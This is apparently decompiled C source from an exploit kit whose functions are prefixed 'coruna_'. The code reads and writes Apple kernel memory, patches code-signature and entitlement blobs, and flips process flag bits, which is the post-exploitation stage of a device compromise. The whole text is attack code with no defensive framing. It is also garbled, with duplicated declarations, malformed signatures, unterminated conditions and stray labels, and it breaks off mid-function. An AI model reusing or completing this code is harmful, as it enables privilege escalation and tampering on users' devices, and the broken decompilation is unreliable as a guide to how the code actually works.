      if (((uint)host_info >> 2 & 1) == 0) {
        handle = coruna_return_zero_28118(val,handle);
        if ((((handle == 0) || (handle = coruna_return_zero_28a34(val,handle), handle == 0)) ||
            (err = coruna_return_zero_24300(val,thread_attr,&bootargs), err == 0)) ||
           (err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(val,handle + (unsigned long)bootargs,8,&scratch), err == 0)) {
          return 0;
        }
      }
      else {
        scratch = host_info & 0xfffffffffffff000;
      }
      *arg = scratch;
      u = 1;
    }
  }
  return u;
}





uint64_t
void coruna_return_zero_23ef8(uint *size,uint flags_2,uint64_t val,uint64_t id_2,uint *count_3)
{
  long handle;
  long addr;
  long off;
  long base;
  long ctx_val;
  long serial;
  long serial_7;
  uint u;
  int err;
  long serial_8;
  int *err;
  int *status;
  uint *ptr;
  uint *buf;
  void *ptr;
  uint size;
  uint *str;
  uint *copy;
  unsigned long version;
  uint64_t *data;
  uint *obj;
  size_t ls22;
  uint64_t port;
  uint tag;
  uint kind;
  uint type_id;
  uint *scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  long host_info;
  long serial_buf;
  long action;
  long block_ctx;
  size_t stack_guard;
  long sa_saved;
  uint sa_new;
  
  sa_new = 0;
  stack_guard = 0;
  sa_saved = 0;
  action = 0;
  block_ctx = 0;
  host_info = 0;
  serial_buf = 0;
  bootargs = 0;
  thread_attr = 0;
  if ((count_3 == (uint *)0x0) || (serial_8 = coruna_kernel600c_via_call_mach_vm_machine_attribute_29df8_1c57c_2(), serial_8 == 0)) {
    return 0;
  }
  version = *(unsigned long *)(size + 0x56);
  handle = 0x40;
  if (version < 0x1f530f02800000) {
    handle = 0x30;
  }
  addr = 0x50;
  if (version < 0x1f530f02800000) {
    addr = 0x40;
  }
  off = 0x20;
  if (version < 0x1f530f02800000) {
    off = 0x10;
  }
  base = 0x80;
  if (version < 0x1f530f02800000) {
    base = 0x78;
  }
  ctx_val = 0x88;
  if (version < 0x1f530f02800000) {
    ctx_val = 0x80;
  }
  serial = 0x90;
  if (version < 0x1f530f02800000) {
    serial = 0x88;
  }
  serial_7 = 0x28;
  if (version < 0x1f530f02800000) {
    serial_7 = 0x18;
  }
  err = coruna_kernel600c_residual_228(size,serial + serial_8,&serial_buf);
  if (err == 0) {
    return 0;
  }
  if ((0x1f52ffffffffff < *(unsigned long *)(size + 0x56)) &&
     (err = coruna_kernel600c_residual_228(size,serial_8 + 0x98,&host_info), err == 0)) {
    return 0;
  }
  err = coruna_kernel600c_residual_228(size,base + serial_8,&block_ctx);
  if (err == 0) {
    return 0;
  }
  err = coruna_kernel600c_residual_228(size,ctx_val + serial_8,&action);
  if (err == 0) {
    return 0;
  }
  err = coruna_kernel600c_via_kernel600c_via_fd_read_full(size,off + serial_8,&sa_new);
  if (err == 0) {
    return 0;
  }
  if ((sa_new & 1) == 0) {
    return 0;
  }
  err = coruna_kernel600c_residual_228(size,handle + serial_8,&stack_guard);
  if (err == 0) {
    return 0;
  }
  err = coruna_kernel600c_residual_228(size,addr + serial_8,&sa_saved);
  if (err == 0) {
    return 0;
  }
  if (sa_saved == 0) {
    return 0;
  }
  if (stack_guard == 0) {
    return 0;
  }
  err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(size,serial_7 + serial_8,8,&bootargs);
  if (err == 0) {
    return 0;
  }
  err = _malloc(stack_guard);
  if (err == (int *)0x0) {
    return 0;
  }
  count_3[0x18] = 0;
  count_3[0x19] = 0;
  count_3[0x12] = 0;
  count_3[0x13] = 0;
  count_3[0x10] = 0;
  count_3[0x11] = 0;
  count_3[0x16] = 0;
  count_3[0x17] = 0;
  count_3[0x14] = 0;
  count_3[0x15] = 0;
  count_3[10] = 0;
  count_3[0xb] = 0;
  count_3[8] = 0;
  count_3[9] = 0;
  count_3[0xe] = 0;
  count_3[0xf] = 0;
  count_3[0xc] = 0;
  count_3[0xd] = 0;
  count_3[2] = 0;
  count_3[3] = 0;
  count_3[0] = 0;
  count_3[1] = 0;
  count_3[6] = 0;
  count_3[7] = 0;
  count_3[4] = 0;
  count_3[5] = 0;
  err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(size,sa_saved,stack_guard,err);
  if (err != 0) {
    *count_3 = sa_new;
    *(long *)(count_3 + 2) = serial_8;
    *(size_t *)(count_3 + 4) = stack_guard;
    *(long *)(count_3 + 6) = sa_saved;
    *(uint64_t *)(count_3 + 8) = thread_attr;
    *(uint64_t *)(count_3 + 10) = bootargs;
    count_3[0x11] = flags_2;
    err = (int)sa_saved;
    size = 0;
    if (block_ctx != 0) {
      size = (int)block_ctx - err;
    }
    count_3[0x13] = size;
    if (size < stack_guard) {
      tag = 0;
      if (action != 0) {
        tag = (int)action - err;
      }
      count_3[0x14] = tag;
      if (((tag == 0) || (tag < stack_guard)) ||
         (((*size & 0x5584001) == 0 && (*(unsigned long *)(size + 0x56) < 0x1f530000000000)))) {
        tag = 0;
        if (serial_buf != 0) {
          tag = (int)serial_buf - err;
        }
        count_3[0x15] = tag;
        if ((tag == 0) || (tag < stack_guard)) {
          tag = 0;
          if (host_info != 0) {
            tag = (int)host_info - err;
          }
          count_3[0x16] = tag;
          if ((tag == 0) || (tag < stack_guard)) {
            if (*err == 0x20cdefa) {
              scratch = (uint *)coruna_malloc();
              coruna_kernel600c_via_kernel5_via_bzero_5(count_3);
              port = 0;
              status = (int *)coruna_memcpy_25294(err);
              if (status != (int *)0x0) {
                err = coruna_iokit_msg_append(scratch,0,status);
                if (err != -1) {
                  tag = 0;
                  size = 0;
                  count_3[0xc] = 1;
                  *(uint **)(count_3 + 0xe) = scratch;
                  count_3[0x10] = 0;
                  {
                    count_3[0x17] = tag;
                    serial_8 = coruna_wire_map_lookup(count_3,size,0xfade0c02);
                    if ((serial_8 != 0) &&
                    ((((count_3[0x12] = (uint)*(byte *)(serial_8 + 0x24),
                    *(unsigned long *)(size + 0x56) < 0x1f530000000000 ||
                    (serial_8 = coruna_wire_map_lookup(count_3,7,0xfade7172), serial_8 == 0)) ||
                    (serial_8 = coruna_wire_map_lookup(count_3,5,0xfade7171), serial_8 != 0)) ||
                    (err = coruna_bzero_5(count_3,5,0xfade7171), err != 0)))) {
                    port = 1;
                    _free(err);
                    return port;
                    }
                  }
                }
cleanup:
                coruna_bzero(status);
              }
check_ok:
              coruna_kernel5_via_bzero_5(scratch);
            }
            else {
              if ((*err != -0x3ff32106) ||
                 coruna_kernel600c_via_kernel5_via_bzero_5(count_3);
                 port = 0;
              tag = err[2];
              if (tag == 0) {
                tag = 0xfffffffe;
              }
              else {
                tag = (tag & 0xff00ff00) >> 8 | (tag & 0xff00ff) << 8;
                version = (unsigned long)(tag >> 0x10 | tag << 0x10);
                ptr = (uint *)(err + 4);
                tag = 0;
                do {
                  u = ptr[-1];
                  kind = (*ptr & 0xff00ff00) >> 8 | (*ptr & 0xff00ff) << 8;
                  type_id = kind >> 0x10 | kind << 0x10;
                  kind = type_id;
                  if (tag <= type_id && tag != 0) {
                    kind = tag;
                  }
                  status = (int *)coruna_memcpy_25294((long)err + (unsigned long)type_id);
                  if (status == (int *)0x0) goto check_ok;
                  tag = (u & 0xff00ff00) >> 8 | (u & 0xff00ff) << 8;
                  tag = tag >> 0x10 | tag << 0x10;
                  err = coruna_iokit_msg_append(scratch,tag,status);
                  if (err == -1) goto cleanup;
                  if (*status == 0x20cdefa) {
                    if (size == 0) {
                      if (u == 0) {
                        tag = 0;
                        goto skip;
                      }
                    }
                    else if (type_id == size) {
skip:
                      count_3[0x10] = tag;
                    }
                  }
                  ptr = ptr + 2;
                  version = version - 1;
                  tag = kind;
                } while (version != 0);
                tag = (uint)((unsigned long)kind + 0x7fffffff4 >> 3);
              }
              size = count_3[0x10];
              if (*scratch != 0) {
                version = 0;
                data = (uint64_t *)(*(long *)(scratch + 2) + 8);
                ptr = (uint *)0x0;
                str = (uint *)0x0;
                kind = 0;
                do {
                  obj = (uint *)*data;
                  u = (*obj & 0xff00ff00) >> 8 | (*obj & 0xff00ff) << 8;
                  u = u >> 0x10 | u << 0x10;
                  buf = ptr;
                  copy = str;
                  type_id = kind;
                  if (u == 0xfade0c02) {
                    copy = obj;
                    if (*(uint *)(data + -1) != size) {
                      copy = str;
                    }
                  }
                  else if ((u == 0xfade7171) &&
                          (buf = obj, type_id = (uint)version, *(uint *)(data + -1) != 5))
                  {
                    buf = ptr;
                    type_id = kind;
                  }
                  version = version + 1;
                  data = data + 2;
                  ptr = buf;
                  str = copy;
                  kind = type_id;
                } while (*scratch != version);
                if (buf != (uint *)0x0) {
                  size = (buf[1] & 0xff00ff00) >> 8 | (buf[1] & 0xff00ff) << 8;
                  version = (unsigned long)(size >> 0x10 | size << 0x10);
                  if (copy == (uint *)0x0) {
next:
                    ls22 = version + 1;
                  }
                  else {
                    size = copy[10];
                    ls22 = (size_t)size;
                    if ((size == 0) || ((size & 0x3fff) != 0)) goto next;
                  }
                  ptr = _realloc(buf,ls22);
                  if (ptr == (void *)0x0) goto check_ok;
                  _bzero((void *)((long)ptr + version),ls22 - version);
                  *(void **)(*(long *)(scratch + 2) + (unsigned long)type_id * 0x10 + 8) = ptr;
                  size = count_3[0x10];
                }
              }
              count_3[0xc] = 1;
              *(uint **)(count_3 + 0xe) = scratch;
done:
              count_3[0x17] = tag;
              serial_8 = coruna_wire_map_lookup(count_3,size,0xfade0c02);
              if ((serial_8 != 0) &&
                 ((((count_3[0x12] = (uint)*(byte *)(serial_8 + 0x24),
                    *(unsigned long *)(size + 0x56) < 0x1f530000000000 ||
                    (serial_8 = coruna_wire_map_lookup(count_3,7,0xfade7172), serial_8 == 0)) ||
                   (serial_8 = coruna_wire_map_lookup(count_3,5,0xfade7171), serial_8 != 0)) ||
                  (err = coruna_bzero_5(count_3,5,0xfade7171), err != 0)))) {
                port = 1;
                _free(err);
                return port;
              }
            }
          }
        }
      }
    }
  }
fail:
  coruna_kernel600c_via_kernel5_via_bzero_5(count_3);
  port = 0;
retry:
  _free(err);
  return port;
}





uint64_t coruna_return_zero_24480(long handle,uint64_t val,uint64_t id_2,uint64_t size_3)
{
  int err;
  long handle;
  uint64_t u;
  uint size;
  uint scratch;
  
  scratch = 0;
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (1 < err - 0x1f53U) {
      if (err != 0x1809 && err != 0x1c1b) {
        return 0;
      }
      size = 0x20000;
      handle = coruna_kernel600c_via_return_zero_293c0(handle);
      u = 0;
      if ((handle != 0) && (u = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,handle + 0x48,4,&scratch), (int)u != 0)) {
      *(bool *)size_3 = (scratch & size) != 0;
      u = 1;
      }
      return u;
    }
  }
  else if ((err != 0x2258 && err != 0x2712) && err != 0x225c) {
    return 0;
  }
  size = 0x80000;
fail:
  handle = coruna_kernel600c_via_return_zero_293c0(handle);
  u = 0;
  if ((handle != 0) && (u = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,handle + 0x48,4,&scratch), (int)u != 0)) {
    *(bool *)size_3 = (scratch & size) != 0;
    u = 1;
  }
  return u;
}





unsigned long coruna_return_zero_2454c(long arg,uint64_t val,uint64_t n,int m)

{
  int fd_11;
  long base;
  unsigned long u;
  uint size;
  uint cache_81;
  
  cache_81 = 0;
  fd_11 = *(int *)(arg + 0x140);
  if (fd_11 < 0x2258) {
    if (1 < fd_11 - 0x1f53U) {
      if (fd_11 != 0x1809 && fd_11 != 0x1c1b) {
        return 0;
      }
      size = 0x20000;
      base = coruna_kernel600c_via_return_zero_293c0(arg);
      u = 0;
      if (base != 0) {
      u = coruna_call_mach_vm_machine_attribute_29df8_1c57c(arg,base + 0x48,4,&cache_81);
      if ((int)u != 0) {
      if (m == 0) {
      cache_81 = cache_81 & (size ^ 0xffffffff);
      }
      else {
      cache_81 = cache_81 | size;
      }
      fd_11 = coruna_call_mach_vm_machine_attribute_29df8_1e994(arg,base + 0x48,&cache_81,4);
      u = (unsigned long)(fd_11 != 0);
      }
      }
      return u;
    }
  }
  else if ((fd_11 != 0x2258 && fd_11 != 0x2712) && fd_11 != 0x225c) {
    return 0;
  }
  size = 0x80000;
load_ok_79:
  base = coruna_kernel600c_via_return_zero_293c0(arg);
  u = 0;
  if (base != 0) {
    u = coruna_call_mach_vm_machine_attribute_29df8_1c57c(arg,base + 0x48,4,&cache_81);
    if ((int)u != 0) {
      if (m == 0) {
        cache_81 = cache_81 & (size ^ 0xffffffff);
      }
      else {
        cache_81 = cache_81 | size;
      }
      fd_11 = coruna_call_mach_vm_machine_attribute_29df8_1e994(arg,base + 0x48,&cache_81,4);
      u = (unsigned long)(fd_11 != 0);
    }
  }
  return u;
}





void coruna_mach_vm_deallocate(long handle,uint64_t val,mach_vm_address_t arg,unsigned long arg_x,
                 vm_prot_t arg_x_x,int flags,int count_2)
{
  uint u;
  long handle;
  vm_map_t target;
  uint size;
  size_t ls4;
  unsigned long version;
  uint8_t *ptr;
  int err;
  kern_return_t lk8;
  int status;
  unsigned long port;
  long addr;
  long off;
  void *ptr;
  uint32_t *buf;
  long base;
  size_t ls16;
  int flags;
  mach_vm_address_t *lpm18;
  unsigned long tag;
  bool err;
  mach_vm_size_t size;
  uint scratch;
  unsigned long bootargs;
  long thread_attr;
  uint8_t host_info[8];
  int serial_buf;
  uint32_t scratch;
  mach_vm_address_t action [3];
  unsigned long block_ctx;
  uint64_t stack_guard;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t sa_saved;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t sa_new;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  int path_buf;
  int tmp_buf;
  long region;
  
  region = *(long *)k_kernel_stack_chk_guard_slot;
  port = coruna_return_zero_23590();
  if (*(long *)k_kernel_stack_chk_guard_slot == region) {
  return;
  }
  ___stack_chk_fail(port);
}





bool coruna_kernel600c_via_wire_map_lookup(uint64_t val,uint64_t id_2,int flags,int count_2)
{
  unsigned long u;
  uint size;
  unsigned long version;
  bool err;
  int err;
  long handle;
  unsigned long port;
  unsigned long tag;
  uint8_t scratch[104];
  
  err = coruna_plist_dict_21c8c(val,id_2,scratch);
  if (err == 0) {
    return false;
  }
  handle = coruna_wire_map_lookup(scratch,0,0xfade0c02);
  if ((handle != 0) &&
     (size = (*(uint *)(handle + 8) & 0xff00ff00) >> 8 | (*(uint *)(handle + 8) & 0xff00ff) << 8,
     0x80 < (size >> 0x10 | size << 0x10) >> 10)) {
    port = *(unsigned long *)(handle + 0x50);
    u = 0x10;
    if (flags == 0) {
      u = 0;
    }
    version = (port & 0xaf00ff00ff00ff00) >> 8 | (port & 0xff00ff00ff00ff) << 8;
    version = (version & 0xffff0000ffff0000) >> 0x10 | (version & 0xffff0000ffff) << 0x10;
    tag = version >> 0x20 | version << 0x20;
    version = 0x40;
    if (count_2 == 0) {
      version = 0;
    }
    port = (port & 0xff00ff00ff00ff00) >> 8 | (port & 0xff00ff00ff00ff) << 8;
    port = (port & 0xffff0000ffff0000) >> 0x10 | (port & 0xffff0000ffff) << 0x10;
    if ((version | u | tag) == (port >> 0x20 | port << 0x20)) {
      err = true;
      coruna_kernel600c_via_kernel5_via_bzero_5(scratch);
      return err;
    }
    u = (tag & 0xff00ff00ff00ff00) >> 8 | (version | u | tag & 0xff00ff00ff00ff) << 8;
    u = (u & 0xffff0000ffff0000) >> 0x10 | (u & 0xffff0000ffff) << 0x10;
    *(unsigned long *)(handle + 0x50) = u >> 0x20 | u << 0x20;
    err = coruna_kernel600c_via_memcpy_25294(scratch,0);
    if (err != 0) {
      err = coruna_kernel600c_via_ctx_test_flag_12(val,scratch);
      err = err != 0;
      coruna_kernel600c_via_kernel5_via_bzero_5(scratch);
      return err;
    }
  }
  err = false;
fail:
  coruna_kernel600c_via_kernel5_via_bzero_5(scratch);
  return err;
}





uint64_t coruna_kernel600c_via_kernel600c_via_kernel5_via_bzero_5(uint64_t val,uint64_t id_2)
{
  uint64_t u;
  uint8_t scratch[104];
  
  u = coruna_plist_dict_21c8c(val,id_2,scratch);
  if ((int)u != 0) {
    coruna_kernel600c_via_kernel5_via_bzero_5(scratch);
    u = 1;
  }
  return u;
}





void coruna_fcntl_24be8(uint64_t val,uint64_t id_2,long handle)
{
  int *err;
  unsigned long *ptr;
  long handle;
  bool err;
  int err;
  int status;
  long addr;
  long off;
  unsigned long u;
  long base;
  uint64_t *buf;
  uint64_t size;
  uint version;
  void *ptr;
  int *status;
  uint8_t port[16];
  long scratch;
  uint bootargs;
  uint thread_attr;
  long host_info;
  long serial_buf;
  uint64_t action;
  long block_ctx;
  uint64_t scratch;
  uint64_t stack_guard;
  uint32_t sa_saved;
  uint64_t bootargs;
  long sa_new;
  long path_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t thread_attr;
  uint64_t host_info;
  unsigned long plist [23];
  uint64_t url_buf;
  unsigned long serial_buf;
  unsigned long json_buf;
  uint8_t frame[20];
  uint work;
  int cache [1016];
  long cache_20;
  
  port = (*(void (*)k_kernel_chkstk_darwin_slot)();
  addr = port;
  cache_20 = *(long *)k_kernel_stack_chk_guard_slot;
  block_ctx = 0;
  scratch = 0;
  serial_buf = 0;
  action = 0;
  host_info = 0;
  off = coruna_kernel600c_via_return_zero_28a34();
  u = 0;
  if ((off == 0) ||
     (u = coruna_return_zero_24300(addr,(long)&scratch + 4,&scratch), (int)u == 0))
  if (*(long *)k_kernel_stack_chk_guard_slot == cache_20) {
  return;
  }
  ___stack_chk_fail(u);
}





unsigned long coruna_kernel600c_via_ptr_canonicalize_4(uint64_t arg,uint64_t val)

{
  int fd_11;
  unsigned long type_id_17;
  long serial_11;
  long serial_12;
  uint cache_91;
  uint cache_81;
  long cache_100;
  long cache_54;
  
  cache_100 = 0;
  cache_54 = 0;
  type_id_17 = coruna_iosurface_wire_meta_offsets(arg,&cache_81,&cache_91);
  if ((int)type_id_17 != 0) {
    fd_11 = coruna_kernel600c_via_ptr_canonicalize_8(arg,val,&cache_54);
    if (fd_11 == 0) {
      type_id_17 = coruna_kernel600c_residual_228(arg,cache_54 + (unsigned long)cache_81,&cache_54);
      if (((int)type_id_17 != 0) && (serial_11 = coruna_ptr_canonicalize(arg,cache_54), type_id_17 = 0, serial_11 != 0)) {
        serial_11 = cache_54 + (unsigned long)cache_91;
        type_id_17 = coruna_kernel600c_residual_228(arg,serial_11,&cache_100);
        if ((int)type_id_17 != 0) {
          if (cache_100 == 0) {
            type_id_17 = 1;
          }
          else {
            serial_12 = coruna_ptr_canonicalize(arg);
            type_id_17 = 0;
            if (serial_12 != 0) {
              fd_11 = coruna_kernel600c_via_mach_vm_machine_attribute_1e63c(arg,serial_11,0);
              type_id_17 = (unsigned long)(fd_11 != 0);
            }
          }
        }
      }
    }
    else {
      type_id_17 = 0;
    }
  }
  return type_id_17;
}





uint64_t coruna_kernel600c_via_return_zero_2b0c0_2(uint64_t val,uint64_t id_2,unsigned long arg)
{
  long handle;
  uint64_t u;
  unsigned long scratch;
  
  scratch = 0;
  handle = coruna_ret_stub_2();
  u = 0;
  if (handle != 0) {
    handle = coruna_return_zero_2b0c0(val,handle);
    u = 0;
    if ((handle != 0) && (u = coruna_kernel600c_residual_228(val,handle,&scratch), (int)u != 0)) {
      if (((uint)scratch >> 2 & 1) == 0) {
        scratch = arg & 0xfffffffffffff000 | scratch | 4;
        u = coruna_kernel600c_residual_229(val,handle);
        if ((int)u == 0) {
          return u;
        }
      }
      u = 1;
    }
  }
  return u;
}





int * coruna_wire_map_slot_lookup(long handle,int flags,uint size)
{
  uint u;
  int *err;
  unsigned long size;
  
  if ((handle != 0) && (*(int *)(handle + 0x30) == 1)) {
    u = **(uint **)(handle + 0x38);
    size = (unsigned long)u;
    if (u != 0) {
      err = *(int **)(*(uint **)(handle + 0x38) + 2);
      do {
        if ((*err == flags) &&
           (u = (**(uint **)(err + 2) & 0xff00ff00) >> 8 |
                    (**(uint **)(err + 2) & 0xff00ff) << 8,
           (u >> 0x10 | u << 0x10) == size)) {
          return err;
        }
        err = err + 4;
        size = size - 1;
      } while (size != 0);
    }
  }
  return (int *)0x0;
}





void * coruna_memcpy_25294(void *ctx)
{
  uint u;
  void *ptr;
  unsigned long size;
  
  u = (*(uint *)((long)ctx + 4) & 0xff00ff00) >> 8 |
          (*(uint *)((long)ctx + 4) & 0xff00ff) << 8;
  size = (unsigned long)(u >> 0x10 | u << 0x10);
  ptr = _malloc(size);
  if (ptr != (void *)0x0) {
    _memcpy(ptr,ctx,size);
  }
  return ptr;
}





void coruna_bzero(void *ctx)
{
  uint u;
  
  if (ctx != (void *)0x0) {
    u = *(uint *)((long)ctx + 4);
    if (u != 0) {
      u = (u & 0xff00ff00) >> 8 | (u & 0xff00ff) << 8;
      _bzero(ctx,(unsigned long)(u >> 0x10 | u << 0x10));
    }
    _free(ctx);
    return;
  }
  return;
}





void coruna_pthread_create_suspended_np(long *handle)
{
  long *ptr;
  void *buf;
  uint u;
  long handle;
  uint *ptr;
  bool err;
  bool status;
  uint8_t *buf;
  bool flags;
  uint16_t size;
  int err;
  int status;
  int flags;
  uint version;
  mach_port_t lm15;
  uint port;
  int count;
  int idx;
  thread_act_t target_act;
  long addr;
  int *err;
  long off;
  void *str;
  void **lppv23;
  long base;
  uint *str;
  uint tag;
  unsigned long kind;
  unsigned long type_id;
  int *status;
  uint64_t type_id_8;
  byte count;
  unsigned long type_id_9;
  unsigned long type_id_10;
  unsigned long type_id_11;
  uint64_t scratch;
  unsigned long bootargs;
  uint thread_attr;
  uint host_info;
  unsigned long serial_buf;
  uint action;
  uint block_ctx;
  uint stack_guard;
  uint64_t sa_saved;
  uint64_t scratch;
  uint64_t sa_new;
  long path_buf;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t tmp_buf;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  long region [4];
  unsigned long plist;
  long url_buf;
  uint64_t block_ctx;
  uint64_t json_buf;
  uint64_t stack_guard;
  uint64_t frame;
  uint64_t sa_saved;
  uint64_t work;
  byte cache;
  uint8_t cache_20;
  uint cache_21;
  long cache_22;
  long cache_23;
  long cache_24;
  uint cache_25;
  uint cache_26;
  uint cache_27;
  uint64_t cache_28;
  int cache_29 [2];
  long cache_30;
  long cache_31;
  int cache_32;
  uint32_t cache_33;
  uint cache_34;
  int cache_35;
  unsigned long cache_36;
  uint cache_37;
  unsigned long cache_38;
  void *cache_39;
  uint cache_40;
  void *cache_41;
  long cache_42;
  unsigned long cache_43;
  pthread_t cache_44;
  uint cache_45;
  uint8_t cache_46[48];
  unsigned long cache_47;
  void *cache_48;
  void *cache_49;
  uint64_t cache_50;
  void *cache_51;
  unsigned long cache_52;
  uint64_t cache_53;
  unsigned long cache_54;
  uint64_t sa_new;
  unsigned long cache_55;
  uint64_t cache_56;
  long cache_57;
  unsigned long *cache_58;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t cache_59;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t cache_60;
  unsigned long json_buf;
  uint64_t cache_61;
  long cache_62;
  uint64_t cache_63;
  uint64_t frame;
  uint64_t work;
  uint64_t cache;
  uint64_t cache_64;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t cache_22;
  uint64_t cache_65;
  uint64_t cache_23;
  uint64_t cache_24;
  uint64_t cache_25;
  uint64_t cache_66;
  uint64_t cache_26;
  uint64_t cache_27;
  uint64_t cache_28;
  uint64_t cache_67;
  uint64_t cache_29;
  uint64_t cache_30;
  uint64_t cache_31;
  uint64_t cache_68;
  uint64_t cache_32;
  uint64_t cache_33;
  uint64_t cache_34;
  uint64_t cache_69;
  uint64_t cache_35;
  uint64_t cache_36;
  uint64_t cache_37;
  uint64_t cache_70;
  uint64_t cache_38;
  uint64_t cache_39;
  uint64_t cache_40;
  uint64_t cache_71;
  uint64_t cache_41;
  uint64_t cache_42;
  uint64_t cache_43;
  uint64_t cache_72;
  uint64_t cache_44;
  uint64_t cache_45;
  uint64_t cache_46;
  uint64_t cache_73;
  uint64_t cache_47;
  uint64_t cache_48;
  uint64_t cache_49;
  long cache_74;
  
  cache_74 = *(long *)k_kernel_stack_chk_guard_slot;
  ptr = (uint *)*handle;
  status = (int *)handle[1];
  type_id_9 = *(unsigned long *)(ptr + 0x56);
  if ((*ptr & 0x5584001) != 0 || 0x1f52ffffffffff < type_id_9) {
    cache_41 = (void *)0x0;
    cache_39 = (void *)0x0;
    cache_27 = 0xffffffff;
    cache_26 = 0;
    cache_25 = 0;
    cache_21 = 0;
    cache_22 = 0;
    cache_23 = 0;
    action = 0;
    err = coruna_return_zero_271dc(status,&cache_41,&cache_39,&cache_26,&cache_25,&cache_21);
    if (err == 0) {
fail:
      port = 0;
      *(uint *)(handle + 2) = port;
      if (*(long *)k_kernel_stack_chk_guard_slot == cache_74) {
      return;
      }
      ___stack_chk_fail();
    }
    cache_32 = -1;
    if (((((char)status[0x18] != '\0') || (*(unsigned long *)(status + 10) >> 0x1d == 0)) ||
        (((status[0x13] == cache_26 && ((status[0x15] == cache_25 || (cache_21 != 0)))) &&
         ((status[0x16] == cache_21 || (*(unsigned long *)(ptr + 0x56) < 0x1f530000000000)))))) &&
       ((addr = coruna_kernel600c_via_return_zero_28a34(ptr,status[0x11]), addr != 0 &&
        (err = coruna_return_zero_24300(ptr,&stack_guard,&block_ctx), err != 0)))) {
      err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(ptr,addr + (unsigned long)block_ctx,8,&cache_36);
      if (err != 0) {
        if (((long)cache_36 < 0x20000000) || ((char)status[0x18] != '\0')) {
          err = coruna_kernel600c_residual_228(ptr,addr + (unsigned long)stack_guard,&cache_24);
          if ((err == 0) ||
             (err = coruna_open_dev_null_27454(ptr,cache_24,&cache_22,&cache_23,&cache_27),
             idx = 5;
             if (cache_32 != -1) {
             coruna_kernel600c_via_kernel5_via_bzero_5(cache_29);
             }
             port = cache_27;
             err = idx;
             if (cache_27 != 0xffffffff) {
             if ((cache_22 != 0) && (cache_23 != 0)) {
             status = coruna_call_mach_vm_machine_attribute_29df8_1e8e0(ptr);
             err = 5;
             if (status != 0) {
             err = idx;
             }
             }
             _close(port);
             }
             if (cache_41 != (void *)0x0) {
             _free(cache_41);
             }
             port = (uint)(err == 0);
             *(uint *)(handle + 2) = port;
             if (*(long *)k_kernel_stack_chk_guard_slot == cache_74) {
             return;
             }
             ___stack_chk_fail();
             }
             cache_38 = 0;
             cache_39 = (void *)0x0;
             cache_37 = 0xffffffff;
             cache_36 = 0x20000000;
             cache_28 = 0;
             cache_27 = 0;
             cache_22 = 0;
             cache_23 = 0;
             cache_21 = 0;
             err = coruna_ctx_test_flag(ptr,0x5184001);
             port = 0;
             *(uint *)(handle + 2) = port;
             if (*(long *)k_kernel_stack_chk_guard_slot == cache_74) {
             return;
        }
        else {
          count = 0;
          serial_buf = cache_36;
load_ok_26:
          str = cache_39;
          if (cache_39 <= *(void **)(status + 4)) {
            err = coruna_ctx_test_flag(ptr,0x5184001);
            if (err == 0) {
              err = coruna_kernel600c_via_vm_deallocate(ptr,*(uint64_t *)(status + 6),cache_41,str);
            }
            else {
              err = coruna_vm_deallocate(ptr,*(uint64_t *)(status + 6),cache_41,str);
            }
            if (err != 0) {
load_ok_28:
              {
                type_id_9 = *(unsigned long *)(ptr + 0x56);
                if ((type_id_9 < 0x1f530000000000) || ((*ptr & 0x5184001) == 0))
                idx = 0;
                if (cache_32 != -1) {
                coruna_kernel600c_via_kernel5_via_bzero_5(cache_29);
                }
                port = cache_27;
                err = idx;
                if (cache_27 != 0xffffffff) {
                if ((cache_22 != 0) && (cache_23 != 0)) {
                status = coruna_call_mach_vm_machine_attribute_29df8_1e8e0(ptr);
                err = 5;
                if (status != 0) {
                err = idx;
                }
                }
                _close(port);
                }
                if (cache_41 != (void *)0x0) {
                _free(cache_41);
                }
                port = (uint)(err == 0);
                *(uint *)(handle + 2) = port;
                if (*(long *)k_kernel_stack_chk_guard_slot == cache_74) {
                return;
                }
                ___stack_chk_fail();
              }
              err = coruna_kernel600c_via_return_zero_2b0c0_2(ptr,status[0x11]);
              if (err != 0) {
                cache_36 = serial_buf;
                err = coruna_call_mach_vm_machine_attribute_29df8_1e994(ptr,addr + (unsigned long)block_ctx,&cache_36,8);
                if (err != 0) {
                  type_id_9 = *(unsigned long *)(ptr + 0x56);
                  if ((type_id_9 < 0x1f530000000000) || (count != 1)) {
load_ok_30:
                    if ((type_id_9 < 0x1f530000000000) || ((*ptr & 0x5184001) == 0))
                    idx = 0;
                    if (cache_32 != -1) {
                    coruna_kernel600c_via_kernel5_via_bzero_5(cache_29);
                    }
                    port = cache_27;
                    err = idx;
                    if (cache_27 != 0xffffffff) {
                    if ((cache_22 != 0) && (cache_23 != 0)) {
                    status = coruna_call_mach_vm_machine_attribute_29df8_1e8e0(ptr);
                    err = 5;
                    if (status != 0) {
                    err = idx;
                    }
                    }
                    _close(port);
                    }
                    if (cache_41 != (void *)0x0) {
                    _free(cache_41);
                    }
                    port = (uint)(err == 0);
                    *(uint *)(handle + 2) = port;
                    if (*(long *)k_kernel_stack_chk_guard_slot == cache_74) {
                    return;
                    }
                    ___stack_chk_fail();
                  }
                  else {
                    err = coruna_kernel600c_via_kernel600c_via_ptr_canonicalize_5(ptr,status[0x11]);
                    if (err != 0) {
                      if (((*ptr & 0x5584001) == 0) ||
                         (0x1f530f027fffff < *(unsigned long *)(ptr + 0x56))) {
                        addr = 0xa0;
                        if (*(unsigned long *)(ptr + 0x56) < 0x1f530f02800000) {
                          addr = 0xa8;
                        }
                        err = coruna_kernel600c_residual_228(ptr,*(long *)(status + 2) + addr,&cache_50);
                        if (err != 0) {
